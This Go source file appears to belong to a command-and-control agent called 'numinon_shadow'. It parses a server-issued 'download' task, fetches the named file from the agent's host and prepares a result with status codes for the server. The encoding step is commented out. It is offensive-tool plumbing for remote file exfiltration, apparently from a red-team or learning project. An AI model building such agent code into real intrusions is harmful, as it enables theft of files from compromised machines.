package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/command/download"
	"numinon_shadow/internal/models"
	"strings"
)

// orchestrateDownload is the orchestrator for the download command.
func (a *Agent) orchestrateDownload(task models.ServerTaskResponse) models.AgentTaskResult {

	// Create an instance of the command-specific args struct
	var args models.DownloadArgs

	// ServerTaskResponse.data contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(task.Data, &args); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal DownloadArgs for Task ID %s: %v. Raw Data: %s", task.TaskID, err, string(task.Data))
		log.Printf("|❗ERR DOWNLOAD ORCHESTATOR| %s", errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureUnmarshallError,
			Error:  errMsg,
		}
	}

	log.Printf("|✅ DOWNLOAD ORCHESTRATOR| Task ID: %s. Orchestrating download from agent path: '%s'",
		task.TaskID, args.SourceFilePath)

	// Call the "doer" function
	downloadResult, err := download.DoDownload(args)

	// Prepare the final TaskResult
	finalResult := models.AgentTaskResult{
		TaskID:     task.TaskID,
		FileSha256: downloadResult.FileSha256, // Hash of the raw file content
		Output:     nil,                       // Will be base64 content on success
		Error:      "",                        // Will be error message on failure
	}

	if err != nil {
		finalResult.Error = err.Error()

		log.Printf("|❗ERR DOWNLOAD ORCHESTATOR| Download execution failed for Task ID %s: %s.",
			task.TaskID, finalResult.Error)

		// NOTE THIS NEEDS TO BE FIXED AND ADAPTED ONCE ACTUAL COMMAND HAS BEEN IMPLEMENTED IN DOER
		errorString := finalResult.Error
		switch {
		case strings.Contains(errorString, "validation:"):
			finalResult.Status = models.StatusFailureInvalidArgs
		case strings.Contains(errorString, "File not found"):
			finalResult.Status = models.StatusFailureFileNotFound
		case strings.Contains(errorString, "Permission denied"):
			finalResult.Status = models.StatusFailurePermissionDenied
		default:
			finalResult.Status = models.StatusFailureReadError
		}
	} else {
		// If we get here it means our doer call succeeded

		// Success from download.Execute()
		// Base64 encode the raw file bytes for transport
		// encodedContent := base64.StdEncoding.EncodeToString(downloadResult.RawFileBytes)
		// finalResult.Output = []byte(encodedContent)

		finalResult.Status = models.StatusSuccess
		log.Printf("|✅ DOWNLOAD ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
			task.TaskID, len(finalResult.Output))
	}
	return finalResult
}
